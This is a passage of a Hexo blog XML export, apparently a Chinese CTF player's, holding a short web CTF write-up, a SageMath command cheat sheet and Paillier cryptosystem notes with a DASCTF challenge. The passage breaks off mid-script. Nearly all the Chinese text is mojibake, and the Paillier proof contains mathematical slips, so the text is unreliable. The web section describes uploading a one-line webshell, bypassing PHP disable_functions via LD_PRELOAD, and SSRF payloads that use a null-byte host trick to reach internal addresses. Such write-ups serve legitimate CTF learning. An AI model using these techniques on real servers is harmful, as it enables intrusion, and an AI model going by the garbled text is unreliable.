HelloWorldï¼Œç„¶åå¼€æœºï¼Œflagé‡Œå¤´è¯´è®©ç©å¤§ç –å—ï¼ˆçœŸéš¾ï¼‰ï¼Œä¸è¿‡æ­»äº†ç›´æ¥ç»™flagï¼Œï¼ˆè¿˜å¥½ï¼‰</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>ç›´æ¥ä¼ ä¸€å¥è¯(base64encode)ï¼Œèšå‰‘è¿ä¸Šï¼Œç„¶ååŠŸèƒ½è¢«ç¦ç”¨å®Œäº†ï¼Œ</p><p>putenvè¿˜åœ¨ï¼Œ</p><p>ç›´æ¥LD_PRELOADç»•disablie_fuc</p><p>systemæ²¡æ³•è¾“å‡ºflagï¼Œæ”¹ä¸€æ”¹hack.cï¼Œç›´æ¥é‡å®šå‘åˆ°æ–‡ä»¶é‡Œå°±å¥½äº†ã€‚</p><p>æœ€åå†åœ¨ä¸€å¥è¯é‚£é‡Œincludeä¸€ä¸‹æˆ‘ä»¬çš„hack.phpå°±å¥½</p><h2 id="cveç‰ˆç­¾åˆ°"><a href="#cveç‰ˆç­¾åˆ°" class="headerlink" title="cveç‰ˆç­¾åˆ°"></a>cveç‰ˆç­¾åˆ°</h2><p>å®‰æ’æœˆèµ›ä¹Ÿæœ‰ï¼Œget_header çš„trickï¼Œç›´æ¥æ—¥å†…ç½‘ï¼Œ<code>url=http://127.0.0.1%00.ctfhub.com</code></p><p>tipsè¯´hostä»¥123ç»“å°¾</p><p>payload:<code>url=http://127.0.0.123%00.ctfhub.com</code></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sageå¸¸ç”¨å‘½ä»¤</title>
      <link href="/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œä¼šè®°å½•ä¸€ç‚¹ç‚¹sageæ¯”è¾ƒå¥½ç”¨çš„å‘½ä»¤ï¼Œç®€æ˜“æ‰‹å†Œ<a href="https://github.com/JayxV/JayxV.github.io/blob/master/2020/05/20/sageå¸¸ç”¨å‘½ä»¤/sagemath.pdf" target="_blank" rel="noopener">åŸæ–‡ä»¶</a>ä¸¢è¿™é‡Œäº†ï¼Œå¹³æ—¶å†é‡åˆ°ä¸€äº›å¥½ç”¨çš„å‘½ä»¤åº”è¯¥è¿˜ä¼šæ›´æ–°ã€‚</p><h2 id="åŸºæœ¬è¯­æ³•ï¼š"><a href="#åŸºæœ¬è¯­æ³•ï¼š" class="headerlink" title="åŸºæœ¬è¯­æ³•ï¼š"></a>åŸºæœ¬è¯­æ³•ï¼š</h2><p>å°†æ•´æ•°è½¬åŒ–ä¸ºäºŒè¿›åˆ¶åˆ—è¡¨</p><p>sage: 10.bits()</p><h2 id="åŸºæœ¬ä»£æ•°"><a href="#åŸºæœ¬ä»£æ•°" class="headerlink" title="åŸºæœ¬ä»£æ•°"></a>åŸºæœ¬ä»£æ•°</h2><p><strong>è§£æ–¹ç¨‹</strong></p><p>solve å‡½æ•°ç”¨äºè§£æ–¹ç¨‹ã€‚è¦ä½¿ç”¨å®ƒï¼Œå…ˆè¦<strong>æŒ‡å®šå˜é‡</strong>ï¼Œç„¶åå°†<strong>æ–¹ç¨‹ï¼ˆæˆ–æ–¹ç¨‹ç»„ï¼‰</strong>ä»¥åŠ<strong>è¦æ±‚è§£çš„å˜é‡</strong>ä½œä¸ºå‚æ•° ä¼ ç»™ solveã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: var('x y p q')</span><br><span class="line"><span class="attribute">sage</span>: eq1 = p+q==9 </span><br><span class="line"><span class="attribute">sage</span>: eq2 = q*y+p*x==-6 </span><br><span class="line"><span class="attribute">sage</span>: eq3 = q*yË†2+p*xË†2==24 </span><br><span class="line"><span class="attribute">sage</span>: solve([eq1,eq2,eq3,p==1],p,q,x,y) </span><br><span class="line"></span><br><span class="line">[[p == 1, q == 8, x == -4/3*sqrt(10) - 2/3, y == 1/6*sqrt(2)*sqrt(5) - 2/3], [p == 1, q == 8, x == 4/3*sqrt(10) - 2/3, y == -1/6*sqrt(2)*sqrt(5) - 2/3]]</span><br><span class="line"></span><br><span class="line">è¦æ±‚è§£çš„è¿‘ä¼¼å€¼ï¼Œå¯ä»¥è¿™æ ·ï¼š</span><br><span class="line"><span class="attribute">sage</span>: solns = solve([eq1,eq2,eq3,p==1],p,q,x,y, solution dict=True) </span><br><span class="line"><span class="attribute">sage</span>: [[s[p].n(30), s[q].n(30), s[x].n(30), s[y].n(30)] for s in solns] </span><br><span class="line"></span><br><span class="line">[[1.0000000, 8.0000000, -4.8830369, -0.13962039], [1.0000000, 8.0000000, 3.5497035, -1.1937129]]</span><br></pre></td></tr></table></figure><p><strong>æ±‚è§£æ–¹ç¨‹çš„æ•°å€¼è§£</strong></p><p>ç”¨ find root åœ¨åŒºé—´ 0 &lt; Ï• &lt; Ï€/2 ä¸Šå¯»æ‰¾ä¸Šè¿°æ–¹ç¨‹çš„è§£ã€‚</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sa<span class="symbol">ge:</span> <span class="built_in">phi</span> = <span class="built_in">var</span>('<span class="built_in">phi</span>') </span><br><span class="line">sa<span class="symbol">ge:</span> <span class="built_in">find</span> root(<span class="built_in">cos</span>(<span class="built_in">phi</span>)==<span class="built_in">sin</span>(<span class="built_in">phi</span>),<span class="number">0</span>,<span class="built_in">pi</span>/<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line"><span class="number">0.785398163397448</span>..</span><br></pre></td></tr></table></figure><h2 id="åŸºæœ¬çš„ç¯"><a href="#åŸºæœ¬çš„ç¯" class="headerlink" title="åŸºæœ¬çš„ç¯"></a>åŸºæœ¬çš„ç¯</h2><p>â€¢ æ•´æ•°ç¯ {â€¦,âˆ’1,0,1,2,â€¦}, Sage ä¸­å« ZZ; </p><p>â€¢ æœ‰ç†æ•°ç¯ ï¼Œå³æ•´æ•°æ„æˆçš„åˆ†æ•°ï¼ŒSage ä¸­å« QQ; </p><p>â€¢ å®æ•°ç¯ï¼ŒSage ä¸­å« RR;</p><p>â€¢ å¤æ•°ç¯ï¼ŒSage ä¸­å« CCï¼›</p><p>sage: ratpoly.&lt;t&gt; = PolynomialRing(QQ) </p><p>ratpolyæ˜¯é›†åˆçš„åå­—ï¼Œè‡ªå·±å®šä¹‰</p><p>.&lt;t&gt;æ˜¯å˜é‡çš„åå­—ï¼Œè‡ªå·±å®šä¹‰</p><p>PolynomialRing()æ˜¯ç¯</p><p>QQæ˜¯æœ‰ç†æ•°ç¯</p><p>æœ‰é™åŸŸè¿˜æœ‰ï¼ŒGF(2)ã€GF(2^8,modulus=[1,0,0,1,1,1,0,0,1]) â€¦â€¦</p><h2 id="çº¿æ€§ä»£æ•°"><a href="#çº¿æ€§ä»£æ•°" class="headerlink" title="çº¿æ€§ä»£æ•°"></a>çº¿æ€§ä»£æ•°</h2><p>ä½¿ç”¨æ–¹æ³• solve right. æ‰§è¡Œ A.solve right(Y) è¿”å›ä¸€ä¸ªçŸ©é˜µï¼ˆæˆ–å‘é‡ï¼‰X æ»¡ è¶³ AX = Y:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sage</span>: A = Matrix([[1,2,3],[3,2,1],[1,1,1]]) </span><br><span class="line"><span class="attribute">sage</span>: Y = vector([0, -4, -1]) </span><br><span class="line"><span class="attribute">sage</span>: X = A.solve_right(Y) </span><br><span class="line"></span><br><span class="line">åæ–œæ  \ å¯ä»¥ä»£æ›¿ solve_right; ç”¨ A \ Y ä»£æ›¿ A.solve right(Y).</span><br><span class="line"><span class="attribute">sage</span>: A \ Y</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼Œä½¿ç”¨ A.solve left(Y) æ±‚è§£æ»¡è¶³ XA = Y çš„ X. </p><p>çŸ©é˜µæ‰€åœ¨çš„ç¯å½±å“å®ƒçš„æ€§è´¨ã€‚</p><p>matrix å‘½ä»¤ä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°å‘Šè¯‰ Sage è¿™ä¸ªçŸ©é˜µ æ˜¯æ•´æ•°ç¯ (ZZ) ä¸Šçš„ï¼Œæœ‰ç†æ•°ç¯ (QQ) ä¸Šçš„ï¼Œè¿˜æ˜¯å®æ•°ç¯ (RR) ä¸Šçš„:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sage: AZ = matrix(ZZ, <span class="string">[[2,0], [0,1]]</span>) </span><br><span class="line">sage: AQ = matrix(QQ, <span class="string">[[2,0], [0,1]]</span>) </span><br><span class="line">sage: AR = matrix(RR, <span class="string">[[2,0], [0,1]]</span>)</span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ª3*3çš„çŸ©é˜µA</p><p>sage: A = Matrix(3,range(9))     </p><p>Açš„é˜¶æ¢¯å½¢å¼</p><p>sage: A.echelon form() </p><p>Açš„è½¬ç½®çŸ©é˜µ</p><p>sage: A.T == A.transpose()</p><p>Açš„è¡Œå‘é‡</p><p>sage: A.rows()</p><p>Açš„åˆ—å‘é‡</p><p>sage: A.columns()</p><h2 id="å¤šé¡¹å¼"><a href="#å¤šé¡¹å¼" class="headerlink" title="å¤šé¡¹å¼"></a>å¤šé¡¹å¼</h2><h3 id="ä¸€å…ƒå¤šé¡¹å¼"><a href="#ä¸€å…ƒå¤šé¡¹å¼" class="headerlink" title="ä¸€å…ƒå¤šé¡¹å¼"></a>ä¸€å…ƒå¤šé¡¹å¼</h3><p>ä¸‰ç§æ–¹å¼åˆ›å»ºå¤šé¡¹å¼ç¯</p><p>sage: R = PolynomialRing(QQ, â€˜tâ€™) </p><p>sage: R = QQ[â€˜tâ€™] </p><p>sage: R.&lt;t&gt; = PolynomialRing(QQ)     or     sage: R.&lt;t&gt; = QQ[â€˜tâ€™]    or     R.&lt;t&gt; = QQ[] </p><p>eg:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sa<span class="symbol">ge:</span> R.&lt;<span class="built_in">t</span>&gt; = QQ[]</span><br><span class="line">sa<span class="symbol">ge:</span> f = <span class="number">2</span>*<span class="built_in">t</span>^<span class="number">7</span> +<span class="number">3</span>*<span class="built_in">t</span>^<span class="number">2</span> -<span class="number">15</span>/<span class="number">19</span></span><br><span class="line">sa<span class="symbol">ge:</span> f^<span class="number">2</span></span><br><span class="line"><span class="number">4</span>*<span class="built_in">t</span>^<span class="number">14</span> + <span class="number">12</span>*<span class="built_in">t</span>^<span class="number">9</span> - <span class="number">60</span>/<span class="number">19</span>*<span class="built_in">t</span>^<span class="number">7</span> + <span class="number">9</span>*<span class="built_in">t</span>^<span class="number">4</span> - <span class="number">90</span>/<span class="number">19</span>*<span class="built_in">t</span>^<span class="number">2</span> + <span class="number">225</span>/<span class="number">361</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆéšæœºå¤šé¡¹å¼</p><p>sage: R.&lt;y&gt; = PolynomialRing(GF(p))</p><p>sage: S = R.random_element(degree)</p><p>æ£€æµ‹å¤šé¡¹å¼æ˜¯å¦ä¸å¯çº¦ï¼š</p><p>sage: S.is_irreduceible()</p><p>(æŠŠå¤šé¡¹å¼æ¯ä¸€é¡¹çš„æ¨¡æ•°ç”±pè½¬å˜ä¸ºSå¯¹åº”é¡¹çš„ç³»æ•°)</p><p>sage: Rs = R.quotient(S)</p><p>å°†æ•´æ•°åˆ—è¡¨è½¬ä¸ºå¤šé¡¹å¼å¯¹åº”é¡¹çš„ç³»æ•°ï¼Œ</p><p>sage: RS([111,111])</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F.&lt;x&gt; = GF(<span class="number">2</span>^<span class="number">8</span>,modulus=[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]) #æ„Ÿè§‰é‚£ä¸ªPolymonialRingéƒ½ä¸ç”¨å†™äº†</span><br><span class="line">F.fetch_int(<span class="number">21</span>) == F(<span class="number">21.</span>bits())</span><br><span class="line">F(<span class="number">21.</span>bits()).integer_representation()#é€†è¿‡ç¨‹</span><br></pre></td></tr></table></figure><h3 id="å¤šå…ƒå¤šé¡¹å¼"><a href="#å¤šå…ƒå¤šé¡¹å¼" class="headerlink" title="å¤šå…ƒå¤šé¡¹å¼"></a>å¤šå…ƒå¤šé¡¹å¼</h3><p>è·Ÿå®šä¹‰ä¸€å…ƒå¤šé¡¹å¼ä¸€æ ·ï¼Œå®šä¹‰å¤šå…ƒå¤šé¡¹å¼ä¹Ÿæœ‰å¤šç§æ–¹æ³•ï¼š</p><p>sage: GF(5)[â€˜z0, z1, z2â€™] </p><p>sage: R.&lt;z0,z1,z2&gt; = GF(5)[];</p><p>sage: PolynomialRing(GF(5), 3, â€˜xyzâ€™)</p><p>eg:</p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">sage: R.<span class="tag">&lt;<span class="name">x,y</span>&gt;</span> = RationalField()[]</span></span><br><span class="line"><span class="xml">sage: f = (x</span><span class="keyword">^3</span><span class="xml"> +</span><span class="number">2</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml">*x)</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: g = x</span><span class="keyword">^2</span><span class="xml">*y</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: f.gcd(g)</span></span><br><span class="line"><span class="xml">x</span><span class="keyword">^2</span><span class="xml"></span></span><br><span class="line"><span class="xml">sage: gcd(f,g)</span></span><br><span class="line"><span class="xml">x</span><span class="keyword">^2</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="æ•°è®º"><a href="#æ•°è®º" class="headerlink" title="æ•°è®º"></a>æ•°è®º</h2><p>sage: R = IntegerModRing(97)     or     R = Zmod(97)        #å®šä¹‰æ¨¡æ•°ä¸º97çš„ç¯</p><p>sage: a = R(2) / R(3)         #ç¯ä¸Šçš„é™¤æ³•</p><p>sage: a.is_square()        #æ˜¯å¦ä¸ºäºŒæ¬¡å‰©ä½™</p><p>sage: gcd(3,2)        #æœ€å¤§å…¬å› æ•°</p><p>sage: factorial(5)        #é˜¶ä¹˜</p><p>sage: next_prime()        #åä¸€ä¸ªç´ æ•°</p><p>sage: previous_prime()        #å‰ä¸€ä¸ªç´ æ•°</p><p>sage: divisors()     #æ‰€æœ‰å› å­</p><p>sage: sigma(n,k)    #nçš„æ‰€æœ‰å› å­çš„kæ¬¡å¹‚ä¹‹å’Œ</p><p>sage: inverse_mod(a,n)    #æ±‚é€†</p><p>ä¸¤ç§å› å¼åˆ†è§£</p><p>sage: factor(1024)        -&gt;    2^10<br>sage: prime_divisors(1024)        -&gt;    [2]</p><p>æœ‰é™åŸŸä¸‹å¼€æ ¹</p><p>sage: R.&lt;X&gt; = PolynomialRing(Zmod(p))</p><p>sage: f = x^256 - c</p><p>sage: f.monic().roots()</p><p>sage: euler_phi(n)        #æ±‚nçš„æ¬§æ‹‰å‡½æ•°        sage: phi = n*prod([1 - 1/p for p in prime divisors(n)]); </p><p>sage: crt(m1,m2,n1,n2)        #ä¸­å›½å‰©ä½™å®šç† ã€x % n1 = m1; x % n2 = m3ã€‘</p><h2 id="Elliptic-Curves"><a href="#Elliptic-Curves" class="headerlink" title="Elliptic Curves"></a>Elliptic Curves</h2><p> EllipticCurve(R, [a1, a2, a3, a4, a6]) eg:</p><p>sage: ecc = EllipticCurve(GF(q), [a,b])        #åˆå§‹åŒ–ä¸€æ¡çº¿</p><p>sage: G = ecc(x,y)        #é€‰å®šå…¶ä¸Šçš„ä¸€ä¸ªç‚¹</p><p>sage: G.order()        #Gç‚¹çš„é˜¶</p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sage </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ paillier cryptosystem</title>
      <link href="/2020/05/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bpaillier%20cryptosystem/"/>
      <url>/2020/05/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bpaillier%20cryptosystem/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/204720" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>&emsp;&emsp;ç°ä»£å…¬é’¥å¯†ç ç³»ç»Ÿä¸­ï¼Œå…¶å®è¿œè¿œä¸æ­¢RSAã€DSAã€ECCç­‰ä¼—æ‰€å‘¨çŸ¥çš„å…¬é’¥å¯†ç ç³»ç»Ÿï¼Œæœ€è¿‘è¿˜å­¦ä¹ åˆ°äº†ä¸€ç§æ¯”è¾ƒå¹´è½»çš„å…¬é’¥å¯†ç ç³»ç»Ÿ â€”â€” <strong>paillier cryptosystem</strong> ä½†æ˜¯wikiä¸Šå¹¶æ²¡æœ‰ç»™å‡ºè¯¥æ–¹æ¡ˆçš„è§£å¯†çš„proofã€‚</p><h2 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h2><p>&emsp;&emsp;Paillierå¯†ç ï¼Œäº1999å¹´ç”±Pascal Paillierå‘æ˜ï¼Œæ˜¯ä¸€ç§ç”¨äºå…¬é’¥åŠ å¯†çš„æ¦‚ç‡éå¯¹ç§°ç®—æ³•ã€‚è¯¥ç®—æ³•å…·æœ‰åŠ æ³•åŒæ€çš„æ€§è´¨ ; è¿™æ„å‘³ç€ï¼Œä»…ç»™å‡ºå…¬é’¥å’Œm1ã€m2åŠ å¯†ï¼Œå¯ä»¥è®¡ç®—å‡ºm1 + m2</p><h2 id="Key-generation"><a href="#Key-generation" class="headerlink" title="Key generation"></a>Key generation</h2><h3 id="The-frist-patternï¼š"><a href="#The-frist-patternï¼š" class="headerlink" title="The frist patternï¼š"></a>The frist patternï¼š</h3><ol><li>éšæœºé€‰æ‹©ä¸¤ä¸ªå¤§è´¨æ•°pã€qæ»¡è¶³$gcd(pq, (p-1)\cdot (q-1))$ã€‚</li><li>è®¡ç®—$n=p\cdot qï¼ŒÎ» = lcm(p-1, q-1) = \frac{(p-1)\cdot (q-1) }{ gcd(p-1,q-1)}$</li><li>é€‰æ‹©éšæœºæ•´æ•°gï¼Œ$0&lt;g&lt;n^2$</li><li>å®šä¹‰$L(x) = \frac{(x-1)} { n}$</li><li>è®¡ç®—$Î¼ = (L(g^Î» \pmod {n^2} ))^{-1} \pmod n$</li><li>å…¬é’¥ä¸º$(nï¼Œg)$</li><li>ç§é’¥ä¸º$(Î»ï¼ŒÎ¼)$</li></ol><h3 id="The-second-patternï¼ˆa-simpler-variantï¼‰ï¼š"><a href="#The-second-patternï¼ˆa-simpler-variantï¼‰ï¼š" class="headerlink" title="The second patternï¼ˆa simpler variantï¼‰ï¼š"></a>The second patternï¼ˆa simpler variantï¼‰ï¼š</h3><p>å…¶ä½™å‚æ•°ä¸å˜ï¼Œä¸»è¦æ”¹å˜äº†gï¼ŒÎ»ï¼ŒÎ¼çš„å®šä¹‰</p><ol><li>$g = n+1$</li><li>$Î» = Ï†(n) = (p-1)\cdot (q-1) $</li><li>$Î¼ = Ï†(n)^{-1} \pmod n$</li></ol><h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><ol><li>è®¾$m$ä¸ºè¦åŠ å¯†çš„æ¶ˆæ¯ï¼Œæ˜¾ç„¶éœ€è¦æ»¡è¶³ï¼Œ$0 â‰¤ m ï¼œ n$</li><li>é€‰æ‹©éšæœº $r$ï¼Œä¿è¯$gcd(r, n) = 1$</li><li>å¯†æ–‡$c$ï¼š$c = g^m\cdot r^n \pmod {n^2}$</li></ol><h2 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h2><ol><li>$m = ( L( c^Î» \pmod {n^2} ) \cdot Î¼ ) \pmod n$</li></ol><h3 id="Proof"><a href="#Proof" class="headerlink" title="Proof"></a>Proof</h3><p>ä»¥ä¸‹æ¨ç†è¿‡ç¨‹å°±ç”¨æ•°å­¦å…¬å¼è®°å½•äº†ï¼Œå¦‚æœå¹³å°æ˜¾ç¤ºä¸å‡ºæ¥çš„è¯ï¼Œå»ºè®®å¤åˆ¶è¿›typoraç­‰æ­¤ç±»ç¼–è¾‘å™¨ä¸­é£Ÿç”¨ï¼Œä¸‹é¢ä¹Ÿä¼šç»™å‡ºæˆªå›¾</p><h4 id="The-first-pattern"><a href="#The-first-pattern" class="headerlink" title="The first pattern"></a>The first pattern</h4><p>ç”± $L(c^Î» \pmod{n^2}\cdot Î¼) \pmod{n}$</p><p>æœ‰ $L(g^{mÎ»}\cdot r^{nÎ»}\pmod{n^2})\cdot Î¼ \pmod{n}$  â‘ </p><p>å…¶ä¸­$Î» = \frac{(p-1) \cdot (q-1)}{gcd((p-1)\cdot (q-1))}, Î¼ = L(g^Î» \pmod{n^2})^{-1} \pmod{n}$</p><p>æ‰€ä»¥â‘ å¼=&gt;  $L(g^{mÎ»}\cdot r^{nÎ»} \pmod{n^2})\cdot L(g^Î» \pmod{n^2})^{-1} \pmod{n}$ â‘¡</p><p>âˆµ$(p-1)|Î», (q-1)|Î»$</p><p>âˆ´$Î» = k_1(p-1) = k_2(q-1)$</p><p>âˆ´$g^Î» = g^{k_1(p-1)}\equiv 1 \pmod{p}ï¼Œå³ (g^Î» -1) | p$</p><p>$ g^Î» = g^{k_2(q-1)}\equiv 1 \pmod{q}ï¼Œ å³ (g^Î» -1) | q$</p><p>âˆ´$  (g^Î» -1) | lcm(p,q) ï¼Œå³ (g^Î» -1) | pqï¼Œå³g^Î» \equiv 1 \pmod{n} $</p><p>âˆ´$g^Î» \pmod{n^2} \equiv 1\pmod{n}$</p><p>âˆ´$g^Î»\pmod{n^2} = k_gn+1; k&lt;n$  </p><p>âˆ´$L(g^Î»\pmod{n^2}) = k_g$</p><p>ä¸”æœ‰</p><ol><li><p>$1+kn \equiv 1+kn \pmod{m^2}$</p></li><li><p>$(1+kn)^2 \equiv 1+2kn+(kn)^2 \equiv 1+2kn \pmod{m^2}$</p></li><li><p>$(1+kn)^3  \equiv 1+3(kn)^2+3kn+(kn)^3 \equiv 1+3kn \pmod{m^2}$</p><p>è¿™é‡Œæˆ‘ä»¬å°±ä¸ç”¨æ•°å­¦åˆ†ææ³•äº†ï¼Œå°±ç›´æ¥æ˜“å¾—äº†</p><p>=&gt; $(1+kn)^{m} \equiv knm+1 \pmod{n^2}$</p></li></ol><p>âˆ´$g^{mÎ»} = (1+k_gn)^{m} \equiv k_gnm+1 \pmod{n^2}$</p><p>âˆ´$r^{nÎ»} = (1+k_nn)^{n} \equiv k_nn^2+1 \equiv 1\pmod{n^2}$</p><p>âˆ´$L(g^{mÎ»}\cdot r^{nÎ»}\pmod{n^2}) = L(k_gnm+1)=mk_g$</p><p>åˆâˆ´$L(g^Î»\pmod{n^2}) = k_g$</p><p>âˆ´â‘¡å¼ï¼š $L(g^{mÎ»} \cdot r^{nÎ»} \pmod{n^2})\cdot L(g^Î» \pmod{n^2})^{-1} \pmod{n}$ =&gt; $mk_g\cdot k_g^{-1} \equiv m \pmod n$</p><p>è¯æ¯•</p><h4 id="The-second-pattern"><a href="#The-second-pattern" class="headerlink" title="The second pattern"></a>The second pattern</h4><p>ç”± $L(c^Î» \pmod{n^2} \cdot Î¼) \pmod{n}$</p><p>æœ‰ $L(g^{mÎ»}\cdot r^{nÎ»} \pmod{n^2} \cdot Î¼) \pmod{n}$  â‘ </p><p>å…¶ä¸­$Î» = (p-1)*(q-1)ï¼Œ Î¼ = Ï†(n)^{-1} \pmod{n}$</p><p>âˆµ$r^{nÎ»} = r^{n(p-1) \cdot (q-1)} = r^{Ï†(n^2)}$</p><p>ç”±æ¬§æ‹‰å®šç†ï¼š$r^{Ï†(n^2)} \equiv 1 \pmod{n^2}$</p><p>â‘ å¼ =&gt; $L(g^{mÎ»} \pmod{n^2} \cdot Î¼) \pmod{n}$  â‘¡</p><p>âˆµ$g = n+1$</p><p>âˆ´$g^{mÎ»} = (1+n)^{mÎ»} \equiv nmÎ»+1 \pmod{n^2}$</p><p>â‘¡å¼=&gt; $L((nmÎ»+1) \cdot Î¼) \pmod{n}$ </p><p>=&gt; $ \frac{(nmÎ»+1)-1}{n} \cdot Î¼ \pmod{n}$ </p><p>=&gt;$(mÎ» \cdot Î¼) \pmod{n}$ â‘¢</p><p>âˆµ$Î» = Ï†(n)ï¼ŒÎ¼ = Ï†(n)^{-1} \pmod{n}$ </p><p>âˆ´â‘¢å¼ï¼š $(mÎ» \cdot Î¼) \equiv m\pmod{n}$</p><p>è¯æ¯•</p><h2 id="DASCTFå››æœˆæœˆèµ›-not-RSA"><a href="#DASCTFå››æœˆæœˆèµ›-not-RSA" class="headerlink" title="DASCTFå››æœˆæœˆèµ› not RSA"></a>DASCTFå››æœˆæœˆèµ› not RSA</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import getPrime as bytes_to_long</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> secret </span>import flag,p,q</span><br><span class="line"><span class="keyword">from</span> sympy import isprime,nextprime</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"><span class="attribute">m</span>=bytes_to_long(flag)</span><br><span class="line"><span class="attribute">n</span>=p*q</span><br><span class="line"><span class="attribute">g</span>=n+1</span><br><span class="line"><span class="attribute">r</span>=random.randint(1,n)</span><br><span class="line"></span><br><span class="line">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"c=%d"</span>%(c)</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"n=%d"</span>%(n)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸€é¢˜å°±æ˜¯ç”¨çš„paillier cryptosystemï¼Œä¸”å‚æ•°ç”¨çš„æ˜¯ä¸Šæ–‡ä¸­çš„The second pattern</p><p>ä½†æ˜¯æˆ‘ä»¬è®¡ç®—$Î» = Ï†(n) = (p-1)\cdot (q-1)$ ï¼Œéœ€è¦ç”¨åˆ°på’Œq</p><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥ä¸Šyafuåˆ†è§£nå‘ç°å¯ä»¥æˆåŠŸåˆ†è§£ï¼ŒåŸå› æ˜¯pä¸qå…¶å®éå¸¸æ¥è¿‘ï¼Œæ‰€ä»¥å…¶å®ç›´æ¥å¯¹nå¼€æ ¹ç„¶åå†åœ¨é™„è¿‘å¯»æ‰¾ç´ æ•°å°±èƒ½æ‰¾åˆ°pã€qäº†ã€‚</p><p>æ‰€ä»¥æ„é€ è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,inverse</span><br><span class="line"><span 